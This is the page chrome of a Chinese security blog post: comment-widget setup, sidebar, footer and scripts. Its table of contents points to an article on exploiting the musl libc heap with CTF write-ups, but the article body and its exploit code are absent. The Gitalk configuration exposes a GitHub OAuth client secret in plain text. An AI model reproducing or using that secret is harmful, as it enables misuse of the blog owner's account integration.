src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "49e0e0e59fbbdb78d2b59ee66a5b1f90",
            repo: "humoooor.github.io",
            owner: "Humoooor",
            clientID: "2262fbb1802e5dc5cc56",
            clientSecret: "55e61f8ed70fa2bcec90cf254ac1864f21cb350b",
            admin: ["Humoooor"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/MyLogo.jpg" alt="Humoooor"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Humoooor</p><p class="is-size-6 is-block">Free to Hack</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">20</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/humoooor" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/humoooor"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:humoooor@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#前言"><span class="level-left"><span class="level-item">1</span><span class="level-item">前言</span></span></a></li><li><a class="level is-mobile" href="#相关结构"><span class="level-left"><span class="level-item">2</span><span class="level-item">相关结构</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#chunk"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">chunk</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#inuse-chunk"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">inuse_chunk</span></span></a></li><li><a class="level is-mobile" href="#unuse-chunk"><span class="level-left"><span class="level-item">2.1.2</span><span class="level-item">unuse_chunk</span></span></a></li></ul></li><li><a class="level is-mobile" href="#group"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">group</span></span></a></li><li><a class="level is-mobile" href="#meta"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">meta</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#avail-meta"><span class="level-left"><span class="level-item">2.3.1</span><span class="level-item">avail_meta</span></span></a></li><li><a class="level is-mobile" href="#freed-meta"><span class="level-left"><span class="level-item">2.3.2</span><span class="level-item">freed_meta</span></span></a></li></ul></li><li><a class="level is-mobile" href="#meta-area"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">meta_area</span></span></a></li><li><a class="level is-mobile" href="#malloc-context"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">malloc_context</span></span></a></li><li><a class="level is-mobile" href="#chunk-gt-meta"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">chunk -&gt; meta</span></span></a></li><li><a class="level is-mobile" href="#大概总结一下"><span class="level-left"><span class="level-item">2.7</span><span class="level-item">大概总结一下</span></span></a></li></ul></li><li><a class="level is-mobile" href="#malloc"><span class="level-left"><span class="level-item">3</span><span class="level-item">malloc</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#malloc-1"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">malloc</span></span></a></li><li><a class="level is-mobile" href="#alloc-slot"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">alloc_slot</span></span></a></li><li><a class="level is-mobile" href="#try-avail"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">try_avail</span></span></a></li><li><a class="level is-mobile" href="#queue"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">queue</span></span></a></li><li><a class="level is-mobile" href="#dequeue"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">dequeue</span></span></a></li><li><a class="level is-mobile" href="#alloc-group"><span class="level-left"><span class="level-item">3.6</span><span class="level-item">alloc_group</span></span></a></li><li><a class="level is-mobile" href="#emframe"><span class="level-left"><span class="level-item">3.7</span><span class="level-item">emframe</span></span></a></li><li><a class="level is-mobile" href="#总结一下"><span class="level-left"><span class="level-item">3.8</span><span class="level-item">总结一下</span></span></a></li><li><a class="level is-mobile" href="#总结简单版"><span class="level-left"><span class="level-item">3.9</span><span class="level-item">总结简单版</span></span></a></li></ul></li><li><a class="level is-mobile" href="#free"><span class="level-left"><span class="level-item">4</span><span class="level-item">free</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#free-1"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">free</span></span></a></li><li><a class="level is-mobile" href="#nontrivial-free"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">nontrivial_free</span></span></a></li><li><a class="level is-mobile" href="#free-group"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">free_group</span></span></a></li><li><a class="level is-mobile" href="#总结一下-1"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">总结一下</span></span></a></li></ul></li><li><a class="level is-mobile" href="#关键"><span class="level-left"><span class="level-item">5</span><span class="level-item">关键</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#dequeue-1"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">dequeue</span></span></a></li></ul></li><li><a class="level is-mobile" href="#利用"><span class="level-left"><span class="level-item">6</span><span class="level-item">利用</span></span></a></li><li><a class="level is-mobile" href="#2022-qwb-UserManager"><span class="level-left"><span class="level-item">7</span><span class="level-item">2022 qwb UserManager</span></span></a></li><li><a class="level is-mobile" href="#Defcon-Quals-2021-mooosl"><span class="level-left"><span class="level-item">8</span><span class="level-item">Defcon Quals 2021 mooosl</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#静态分析"><span class="level-left"><span class="level-item">8.1</span><span class="level-item">静态分析</span></span></a></li><li><a class="level is-mobile" href="#利用点"><span class="level-left"><span class="level-item">8.2</span><span class="level-item">利用点</span></span></a></li><li><a class="level is-mobile" href="#exp"><span class="level-left"><span class="level-item">8.3</span><span class="level-item">exp</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">9</span><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-08T09:58:00.000Z">2024-01-08</time></p><p class="title"><a href="/2024/01/08/2024.01/">2024.01</a></p><p class="categories"><a href="/categories/Month-Report/">Month Report</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-04T12:13:00.000Z">2024-01-04</time></p><p class="title"><a href="/2024/01/04/2023.07%20-%202023.12/">2023.07 - 2023.12</a></p><p class="categories"><a href="/categories/Month-Report/">Month Report</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-09-17T14:26:00.000Z">2023-09-17</time></p><p class="title"><a href="/2023/09/17/Linux%20Kernel%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">Linux Kernel 内存管理</a></p><p class="categories"><a href="/categories/Computer-Science/">Computer Science</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-08-20T00:53:00.000Z">2023-08-20</time></p><p class="title"><a href="/2023/08/20/Kernel%20Pwn%20%E5%85%A5%E9%97%A8/">Kernel Pwn 入门</a></p><p class="categories"><a href="/categories/Pwn/">Pwn</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-05T03:04:00.000Z">2023-06-05</time></p><p class="title"><a href="/2023/06/05/2023.06/">2023.06</a></p><p class="categories"><a href="/categories/Month-Report/">Month Report</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/"><span class="level-start"><span class="level-item">2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/FILE/"><span class="tag">FILE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Kernel/"><span class="tag">Linux Kernel</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Memory-Management/"><span class="tag">Memory Management</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Musl-libc/"><span class="tag">Musl libc</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Operating-System/"><span class="tag">Operating System</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RISC-V/"><span class="tag">RISC-V</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Rust/"><span class="tag">Rust</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Xv6/"><span class="tag">Xv6</span><span class="tag">7</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/MyLogo.jpg" alt="Humoooor&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 Humoooor</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/humoooor"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>